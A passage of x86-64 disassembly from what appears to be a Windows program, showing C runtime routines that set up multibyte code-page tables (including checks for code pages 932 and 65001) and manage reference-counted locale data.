   140004eb5:	33 d2                	xor    %edx,%edx
   140004eb7:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140004ebb:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140004ec1:	e8 6a d4 ff ff       	call   0x140002330
   140004ec6:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   140004ecb:	89 7e 04             	mov    %edi,0x4(%rsi)
   140004ece:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140004ed5:	0f 85 94 00 00 00    	jne    0x140004f6f
   140004edb:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   140004ee0:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140004ee4:	74 2c                	je     0x140004f12
   140004ee6:	38 59 01             	cmp    %bl,0x1(%rcx)
   140004ee9:	74 27                	je     0x140004f12
   140004eeb:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140004eef:	0f b6 11             	movzbl (%rcx),%edx
   140004ef2:	3b d0                	cmp    %eax,%edx
   140004ef4:	77 14                	ja     0x140004f0a
   140004ef6:	2b c2                	sub    %edx,%eax
   140004ef8:	8d 7a 01             	lea    0x1(%rdx),%edi
   140004efb:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   140004efe:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   140004f03:	03 fd                	add    %ebp,%edi
   140004f05:	48 2b d5             	sub    %rbp,%rdx
   140004f08:	75 f4                	jne    0x140004efe
   140004f0a:	48 83 c1 02          	add    $0x2,%rcx
   140004f0e:	38 19                	cmp    %bl,(%rcx)
   140004f10:	75 d4                	jne    0x140004ee6
   140004f12:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140004f16:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140004f1b:	80 08 08             	orb    $0x8,(%rax)
   140004f1e:	48 03 c5             	add    %rbp,%rax
   140004f21:	48 2b cd             	sub    %rbp,%rcx
   140004f24:	75 f5                	jne    0x140004f1b
   140004f26:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140004f29:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140004f2f:	74 2e                	je     0x140004f5f
   140004f31:	83 e9 04             	sub    $0x4,%ecx
   140004f34:	74 20                	je     0x140004f56
   140004f36:	83 e9 0d             	sub    $0xd,%ecx
   140004f39:	74 12                	je     0x140004f4d
   140004f3b:	3b cd                	cmp    %ebp,%ecx
   140004f3d:	74 05                	je     0x140004f44
   140004f3f:	48 8b c3             	mov    %rbx,%rax
   140004f42:	eb 22                	jmp    0x140004f66
   140004f44:	48 8b 05 0d 9c 00 00 	mov    0x9c0d(%rip),%rax        # 0x14000eb58
   140004f4b:	eb 19                	jmp    0x140004f66
   140004f4d:	48 8b 05 fc 9b 00 00 	mov    0x9bfc(%rip),%rax        # 0x14000eb50
   140004f54:	eb 10                	jmp    0x140004f66
   140004f56:	48 8b 05 eb 9b 00 00 	mov    0x9beb(%rip),%rax        # 0x14000eb48
   140004f5d:	eb 07                	jmp    0x140004f66
   140004f5f:	48 8b 05 da 9b 00 00 	mov    0x9bda(%rip),%rax        # 0x14000eb40
   140004f66:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140004f6d:	eb 02                	jmp    0x140004f71
   140004f6f:	8b eb                	mov    %ebx,%ebp
   140004f71:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140004f74:	e9 0b ff ff ff       	jmp    0x140004e84
   140004f79:	39 1d 91 3b 01 00    	cmp    %ebx,0x13b91(%rip)        # 0x140018b10
   140004f7f:	0f 85 f5 00 00 00    	jne    0x14000507a
   140004f85:	83 c8 ff             	or     $0xffffffff,%eax
   140004f88:	e9 f7 00 00 00       	jmp    0x140005084
   140004f8d:	33 d2                	xor    %edx,%edx
   140004f8f:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140004f93:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140004f99:	e8 92 d3 ff ff       	call   0x140002330
   140004f9e:	41 8b c6             	mov    %r14d,%eax
   140004fa1:	4d 8d 4d 10          	lea    0x10(%r13),%r9
   140004fa5:	4c 8d 3d 04 25 01 00 	lea    0x12504(%rip),%r15        # 0x1400174b0
   140004fac:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140004fb2:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   140004fb6:	49 c1 e3 04          	shl    $0x4,%r11
   140004fba:	4d 03 cb             	add    %r11,%r9
   140004fbd:	49 8b d1             	mov    %r9,%rdx
   140004fc0:	41 38 19             	cmp    %bl,(%r9)
   140004fc3:	74 3e                	je     0x140005003
   140004fc5:	38 5a 01             	cmp    %bl,0x1(%rdx)
   140004fc8:	74 39                	je     0x140005003
   140004fca:	44 0f b6 02          	movzbl (%rdx),%r8d
   140004fce:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004fd2:	44 3b c0             	cmp    %eax,%r8d
   140004fd5:	77 24                	ja     0x140004ffb
   140004fd7:	45 8d 50 01          	lea    0x1(%r8),%r10d
   140004fdb:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   140004fe2:	73 17                	jae    0x140004ffb
   140004fe4:	41 8a 07             	mov    (%r15),%al
   140004fe7:	44 03 c5             	add    %ebp,%r8d
   140004fea:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   140004fef:	44 03 d5             	add    %ebp,%r10d
   140004ff2:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004ff6:	44 3b c0             	cmp    %eax,%r8d
   140004ff9:	76 e0                	jbe    0x140004fdb
   140004ffb:	48 83 c2 02          	add    $0x2,%rdx
   140004fff:	38 1a                	cmp    %bl,(%rdx)
   140005001:	75 c2                	jne    0x140004fc5
   140005003:	49 83 c1 08          	add    $0x8,%r9
   140005007:	4c 03 fd             	add    %rbp,%r15
   14000500a:	4c 2b f5             	sub    %rbp,%r14
   14000500d:	75 ae                	jne    0x140004fbd
   14000500f:	89 7e 04             	mov    %edi,0x4(%rsi)
   140005012:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140005015:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   14000501b:	74 29                	je     0x140005046
   14000501d:	83 ef 04             	sub    $0x4,%edi
   140005020:	74 1b                	je     0x14000503d
   140005022:	83 ef 0d             	sub    $0xd,%edi
   140005025:	74 0d                	je     0x140005034
   140005027:	3b fd                	cmp    %ebp,%edi
   140005029:	75 22                	jne    0x14000504d
   14000502b:	48 8b 1d 26 9b 00 00 	mov    0x9b26(%rip),%rbx        # 0x14000eb58
   140005032:	eb 19                	jmp    0x14000504d
   140005034:	48 8b 1d 15 9b 00 00 	mov    0x9b15(%rip),%rbx        # 0x14000eb50
   14000503b:	eb 10                	jmp    0x14000504d
   14000503d:	48 8b 1d 04 9b 00 00 	mov    0x9b04(%rip),%rbx        # 0x14000eb48
   140005044:	eb 07                	jmp    0x14000504d
   140005046:	48 8b 1d f3 9a 00 00 	mov    0x9af3(%rip),%rbx        # 0x14000eb40
   14000504d:	4c 2b de             	sub    %rsi,%r11
   140005050:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140005057:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   14000505b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005060:	4b 8d 3c 2b          	lea    (%r11,%r13,1),%rdi
   140005064:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   140005069:	66 89 02             	mov    %ax,(%rdx)
   14000506c:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140005070:	48 2b cd             	sub    %rbp,%rcx
   140005073:	75 ef                	jne    0x140005064
   140005075:	e9 19 fe ff ff       	jmp    0x140004e93
   14000507a:	48 8b ce             	mov    %rsi,%rcx
   14000507d:	e8 aa 00 00 00       	call   0x14000512c
   140005082:	33 c0                	xor    %eax,%eax
   140005084:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005089:	48 33 cc             	xor    %rsp,%rcx
   14000508c:	e8 8f c2 ff ff       	call   0x140001320
   140005091:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140005098:	00 
   140005099:	48 83 c4 40          	add    $0x40,%rsp
   14000509d:	41 5f                	pop    %r15
   14000509f:	41 5e                	pop    %r14
   1400050a1:	41 5d                	pop    %r13
   1400050a3:	41 5c                	pop    %r12
   1400050a5:	5f                   	pop    %rdi
   1400050a6:	5e                   	pop    %rsi
   1400050a7:	5d                   	pop    %rbp
   1400050a8:	c3                   	ret
   1400050a9:	cc                   	int3
   1400050aa:	cc                   	int3
   1400050ab:	cc                   	int3
   1400050ac:	40 53                	rex push %rbx
   1400050ae:	48 83 ec 40          	sub    $0x40,%rsp
   1400050b2:	8b d9                	mov    %ecx,%ebx
   1400050b4:	33 d2                	xor    %edx,%edx
   1400050b6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400050bb:	e8 94 fc ff ff       	call   0x140004d54
   1400050c0:	83 25 49 3a 01 00 00 	andl   $0x0,0x13a49(%rip)        # 0x140018b10
   1400050c7:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1400050ca:	75 12                	jne    0x1400050de
   1400050cc:	c7 05 3a 3a 01 00 01 	movl   $0x1,0x13a3a(%rip)        # 0x140018b10
   1400050d3:	00 00 00 
   1400050d6:	ff 15 4c 07 01 00    	call   *0x1074c(%rip)        # 0x140015828
   1400050dc:	eb 15                	jmp    0x1400050f3
   1400050de:	83 fb fd             	cmp    $0xfffffffd,%ebx
   1400050e1:	75 14                	jne    0x1400050f7
   1400050e3:	c7 05 23 3a 01 00 01 	movl   $0x1,0x13a23(%rip)        # 0x140018b10
   1400050ea:	00 00 00 
   1400050ed:	ff 15 bd 06 01 00    	call   *0x106bd(%rip)        # 0x1400157b0
   1400050f3:	8b d8                	mov    %eax,%ebx
   1400050f5:	eb 17                	jmp    0x14000510e
   1400050f7:	83 fb fc             	cmp    $0xfffffffc,%ebx
   1400050fa:	75 12                	jne    0x14000510e
   1400050fc:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140005101:	c7 05 05 3a 01 00 01 	movl   $0x1,0x13a05(%rip)        # 0x140018b10
   140005108:	00 00 00 
   14000510b:	8b 58 0c             	mov    0xc(%rax),%ebx
   14000510e:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140005113:	74 0c                	je     0x140005121
   140005115:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000511a:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140005121:	8b c3                	mov    %ebx,%eax
   140005123:	48 83 c4 40          	add    $0x40,%rsp
   140005127:	5b                   	pop    %rbx
   140005128:	c3                   	ret
   140005129:	cc                   	int3
   14000512a:	cc                   	int3
   14000512b:	cc                   	int3
   14000512c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005131:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005136:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000513b:	57                   	push   %rdi
   14000513c:	48 83 ec 20          	sub    $0x20,%rsp
   140005140:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   140005144:	48 8b f1             	mov    %rcx,%rsi
   140005147:	bd 01 01 00 00       	mov    $0x101,%ebp
   14000514c:	48 8b cb             	mov    %rbx,%rcx
   14000514f:	44 8b c5             	mov    %ebp,%r8d
   140005152:	33 d2                	xor    %edx,%edx
   140005154:	e8 d7 d1 ff ff       	call   0x140002330
   140005159:	33 c0                	xor    %eax,%eax
   14000515b:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   14000515f:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140005163:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005168:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   14000516f:	0f b7 c0             	movzwl %ax,%eax
   140005172:	66 f3 ab             	rep stos %ax,(%rdi)
   140005175:	48 8d 3d f4 1e 01 00 	lea    0x11ef4(%rip),%rdi        # 0x140017070
   14000517c:	48 2b fe             	sub    %rsi,%rdi
   14000517f:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   140005182:	88 03                	mov    %al,(%rbx)
   140005184:	48 ff c3             	inc    %rbx
   140005187:	48 83 ed 01          	sub    $0x1,%rbp
   14000518b:	75 f2                	jne    0x14000517f
   14000518d:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   140005194:	ba 00 01 00 00       	mov    $0x100,%edx
   140005199:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   14000519c:	88 01                	mov    %al,(%rcx)
   14000519e:	48 ff c1             	inc    %rcx
   1400051a1:	48 83 ea 01          	sub    $0x1,%rdx
   1400051a5:	75 f2                	jne    0x140005199
   1400051a7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400051ac:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400051b1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400051b6:	48 83 c4 20          	add    $0x20,%rsp
   1400051ba:	5f                   	pop    %rdi
   1400051bb:	c3                   	ret
   1400051bc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400051c1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400051c6:	57                   	push   %rdi
   1400051c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400051cb:	48 8b f2             	mov    %rdx,%rsi
   1400051ce:	48 8b f9             	mov    %rcx,%rdi
   1400051d1:	8b 05 f9 26 01 00    	mov    0x126f9(%rip),%eax        # 0x1400178d0
   1400051d7:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   1400051dd:	74 13                	je     0x1400051f2
   1400051df:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   1400051e6:	00 
   1400051e7:	74 09                	je     0x1400051f2
   1400051e9:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   1400051f0:	eb 64                	jmp    0x140005256
   1400051f2:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400051f7:	e8 e4 f1 ff ff       	call   0x1400043e0
   1400051fc:	90                   	nop
   1400051fd:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140005204:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005209:	48 3b 1e             	cmp    (%rsi),%rbx
   14000520c:	74 3e                	je     0x14000524c
   14000520e:	48 85 db             	test   %rbx,%rbx
   140005211:	74 22                	je     0x140005235
   140005213:	83 c8 ff             	or     $0xffffffff,%eax
   140005216:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   14000521a:	83 f8 01             	cmp    $0x1,%eax
   14000521d:	75 16                	jne    0x140005235
   14000521f:	48 8d 05 4a 1e 01 00 	lea    0x11e4a(%rip),%rax        # 0x140017070
   140005226:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000522b:	48 3b c8             	cmp    %rax,%rcx
   14000522e:	74 05                	je     0x140005235
   140005230:	e8 9f 05 00 00       	call   0x1400057d4
   140005235:	48 8b 06             	mov    (%rsi),%rax
   140005238:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000523f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005244:	f0 ff 00             	lock incl (%rax)
   140005247:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000524c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140005251:	e8 a6 f1 ff ff       	call   0x1400043fc
   140005256:	48 85 db             	test   %rbx,%rbx
   140005259:	74 13                	je     0x14000526e
   14000525b:	48 8b c3             	mov    %rbx,%rax
   14000525e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005263:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005268:	48 83 c4 20          	add    $0x20,%rsp
   14000526c:	5f                   	pop    %rdi
   14000526d:	c3                   	ret
   14000526e:	e8 d9 e7 ff ff       	call   0x140003a4c
   140005273:	90                   	nop
   140005274:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005279:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000527e:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140005283:	55                   	push   %rbp
   140005284:	56                   	push   %rsi
   140005285:	57                   	push   %rdi
   140005286:	48 8b ec             	mov    %rsp,%rbp
   140005289:	48 83 ec 40          	sub    $0x40,%rsp
   14000528d:	40 8a f2             	mov    %dl,%sil
   140005290:	8b d9                	mov    %ecx,%ebx
   140005292:	49 8b d1             	mov    %r9,%rdx
   140005295:	49 8b c8             	mov    %r8,%rcx
   140005298:	e8 1f ff ff ff       	call   0x1400051bc
   14000529d:	8b cb                	mov    %ebx,%ecx
   14000529f:	e8 08 fe ff ff       	call   0x1400050ac
   1400052a4:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400052a8:	8b f8                	mov    %eax,%edi
   1400052aa:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   1400052b1:	41 3b 40 04          	cmp    0x4(%r8),%eax
   1400052b5:	75 07                	jne    0x1400052be
   1400052b7:	33 c0                	xor    %eax,%eax
   1400052b9:	e9 b8 00 00 00       	jmp    0x140005376
   1400052be:	b9 28 02 00 00       	mov    $0x228,%ecx
   1400052c3:	e8 c8 14 00 00       	call   0x140006790
   1400052c8:	48 8b d8             	mov    %rax,%rbx
   1400052cb:	48 85 c0             	test   %rax,%rax
   1400052ce:	0f 84 95 00 00 00    	je     0x140005369
   1400052d4:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400052d8:	ba 04 00 00 00       	mov    $0x4,%edx
   1400052dd:	48 8b cb             	mov    %rbx,%rcx
   1400052e0:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   1400052e7:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   1400052eb:	0f 10 00             	movups (%rax),%xmm0
   1400052ee:	0f 11 01             	movups %xmm0,(%rcx)
   1400052f1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400052f5:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400052f9:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400052fd:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140005301:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140005305:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140005309:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000530d:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140005311:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140005315:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140005319:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000531d:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140005321:	49 03 c8             	add    %r8,%rcx
   140005324:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140005328:	49 03 c0             	add    %r8,%rax
   14000532b:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   14000532f:	48 83 ea 01          	sub    $0x1,%rdx
   140005333:	75 b6                	jne    0x1400052eb
   140005335:	0f 10 00             	movups (%rax),%xmm0
   140005338:	0f 11 01             	movups %xmm0,(%rcx)
   14000533b:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000533f:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140005343:	48 8b 40 20          	mov    0x20(%rax),%rax
   140005347:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000534b:	8b cf                	mov    %edi,%ecx
   14000534d:	21 13                	and    %edx,(%rbx)
   14000534f:	48 8b d3             	mov    %rbx,%rdx
   140005352:	e8 99 fa ff ff       	call   0x140004df0
   140005357:	8b f8                	mov    %eax,%edi
   140005359:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000535c:	75 25                	jne    0x140005383
   14000535e:	e8 99 0f 00 00       	call   0x1400062fc
   140005363:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005369:	83 cf ff             	or     $0xffffffff,%edi
   14000536c:	48 8b cb             	mov    %rbx,%rcx
   14000536f:	e8 60 04 00 00       	call   0x1400057d4
   140005374:	8b c7                	mov    %edi,%eax
   140005376:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000537b:	48 83 c4 40          	add    $0x40,%rsp
   14000537f:	5f                   	pop    %rdi
   140005380:	5e                   	pop    %rsi
   140005381:	5d                   	pop    %rbp
   140005382:	c3                   	ret
   140005383:	40 84 f6             	test   %sil,%sil
   140005386:	75 05                	jne    0x14000538d
   140005388:	e8 53 d6 ff ff       	call   0x1400029e0
   14000538d:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005391:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140005398:	83 c8 ff             	or     $0xffffffff,%eax
   14000539b:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000539f:	83 f8 01             	cmp    $0x1,%eax
   1400053a2:	75 1c                	jne    0x1400053c0
   1400053a4:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400053a8:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1400053af:	48 8d 05 ba 1c 01 00 	lea    0x11cba(%rip),%rax        # 0x140017070
   1400053b6:	48 3b c8             	cmp    %rax,%rcx
   1400053b9:	74 05                	je     0x1400053c0
   1400053bb:	e8 14 04 00 00       	call   0x1400057d4
   1400053c0:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400053c6:	48 8b cb             	mov    %rbx,%rcx
   1400053c9:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400053cd:	33 db                	xor    %ebx,%ebx
   1400053cf:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400053d6:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400053da:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   1400053e0:	85 0d ea 24 01 00    	test   %ecx,0x124ea(%rip)        # 0x1400178d0
   1400053e6:	75 84                	jne    0x14000536c
   1400053e8:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1400053ec:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400053f0:	4c 8d 4d e4          	lea    -0x1c(%rbp),%r9
   1400053f4:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1400053f8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400053fc:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005400:	8d 43 05             	lea    0x5(%rbx),%eax
   140005403:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140005407:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000540a:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000540e:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140005411:	e8 02 02 00 00       	call   0x140005618
   140005416:	40 84 f6             	test   %sil,%sil
   140005419:	0f 84 4d ff ff ff    	je     0x14000536c
   14000541f:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140005423:	48 8b 08             	mov    (%rax),%rcx
   140005426:	48 89 0d e3 22 01 00 	mov    %rcx,0x122e3(%rip)        # 0x140017710
   14000542d:	e9 3a ff ff ff       	jmp    0x14000536c
   140005432:	cc                   	int3
   140005433:	cc                   	int3
   140005434:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005439:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000543e:	55                   	push   %rbp
   14000543f:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140005446:	ff 
   140005447:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   14000544e:	48 8b 05 e3 1b 01 00 	mov    0x11be3(%rip),%rax        # 0x140017038
   140005455:	48 33 c4             	xor    %rsp,%rax
   140005458:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   14000545f:	48 8b d9             	mov    %rcx,%rbx
   140005462:	8b 49 04             	mov    0x4(%rcx),%ecx
   140005465:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000546b:	0f 84 3d 01 00 00    	je     0x1400055ae
   140005471:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140005476:	ff 15 3c 03 01 00    	call   *0x1033c(%rip)        # 0x1400157b8
   14000547c:	85 c0                	test   %eax,%eax
   14000547e:	0f 84 2a 01 00 00    	je     0x1400055ae
   140005484:	33 c0                	xor    %eax,%eax
   140005486:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000548b:	be 00 01 00 00       	mov    $0x100,%esi
   140005490:	88 01                	mov    %al,(%rcx)
   140005492:	ff c0                	inc    %eax
   140005494:	48 ff c1             	inc    %rcx
   140005497:	3b c6                	cmp    %esi,%eax
   140005499:	72 f5                	jb     0x140005490
   14000549b:	8a 44 24 56          	mov    0x56(%rsp),%al
   14000549f:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   1400054a4:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   1400054a9:	eb 20                	jmp    0x1400054cb
   1400054ab:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1400054b0:	0f b6 c8             	movzbl %al,%ecx
   1400054b3:	eb 0b                	jmp    0x1400054c0
   1400054b5:	3b ce                	cmp    %esi,%ecx
   1400054b7:	73 0c                	jae    0x1400054c5
   1400054b9:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   1400054be:	ff c1                	inc    %ecx
   1400054c0:	41 3b c8             	cmp    %r8d,%ecx
   1400054c3:	76 f0                	jbe    0x1400054b5
   1400054c5:	48 83 c2 02          	add    $0x2,%rdx
   1400054c9:	8a 02                	mov    (%rdx),%al
   1400054cb:	84 c0                	test   %al,%al
   1400054cd:	75 dc                	jne    0x1400054ab
   1400054cf:	8b 43 04             	mov    0x4(%rbx),%eax
   1400054d2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400054d7:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   1400054dc:	44 8b ce             	mov    %esi,%r9d
   1400054df:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400054e3:	ba 01 00 00 00       	mov    $0x1,%edx
   1400054e8:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   1400054ef:	33 c9                	xor    %ecx,%ecx
   1400054f1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400054f6:	e8 21 13 00 00       	call   0x14000681c
   1400054fb:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140005500:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140005505:	8b 43 04             	mov    0x4(%rbx),%eax
   140005508:	44 8b c6             	mov    %esi,%r8d
   14000550b:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140005512:	33 c9                	xor    %ecx,%ecx
   140005514:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005518:	48 8d 45 70          	lea    0x70(%rbp),%rax
   14000551c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140005520:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005525:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140005529:	e8 2a 3b 00 00       	call   0x140009058
   14000552e:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140005533:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140005538:	8b 43 04             	mov    0x4(%rbx),%eax
   14000553b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140005541:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140005548:	33 c9                	xor    %ecx,%ecx
   14000554a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000554e:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140005555:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140005559:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000555e:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140005562:	e8 f1 3a 00 00       	call   0x140009058
   140005567:	b8 01 00 00 00       	mov    $0x1,%eax
   14000556c:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140005573:	f6 02 01             	testb  $0x1,(%rdx)
   140005576:	74 0b                	je     0x140005583
   140005578:	80 4c 18 18 10       	orb    $0x10,0x18(%rax,%rbx,1)
   14000557d:	8a 4c 05 6f          	mov    0x6f(%rbp,%rax,1),%cl
   140005581:	eb 15                	jmp    0x140005598
   140005583:	f6 02 02             	testb  $0x2,(%rdx)
   140005586:	74 0e                	je     0x140005596
   140005588:	80 4c 18 18 20       	orb    $0x20,0x18(%rax,%rbx,1)
   14000558d:	8a 8c 05 6f 01 00 00 	mov    0x16f(%rbp,%rax,1),%cl
   140005594:	eb 02                	jmp    0x140005598
   140005596:	32 c9                	xor    %cl,%cl
   140005598:	88 8c 18 18 01 00 00 	mov    %cl,0x118(%rax,%rbx,1)
   14000559f:	48 83 c2 02          	add    $0x2,%rdx
   1400055a3:	48 ff c0             	inc    %rax
   1400055a6:	48 83 ee 01          	sub    $0x1,%rsi
   1400055aa:	75 c7                	jne    0x140005573
   1400055ac:	eb 43                	jmp    0x1400055f1
   1400055ae:	33 d2                	xor    %edx,%edx
   1400055b0:	be 00 01 00 00       	mov    $0x100,%esi
   1400055b5:	8d 4a 01             	lea    0x1(%rdx),%ecx
   1400055b8:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   1400055bc:	41 8d 40 20          	lea    0x20(%r8),%eax
   1400055c0:	83 f8 19             	cmp    $0x19,%eax
   1400055c3:	77 0a                	ja     0x1400055cf
   1400055c5:	80 4c 0b 18 10       	orb    $0x10,0x18(%rbx,%rcx,1)
   1400055ca:	8d 42 20             	lea    0x20(%rdx),%eax
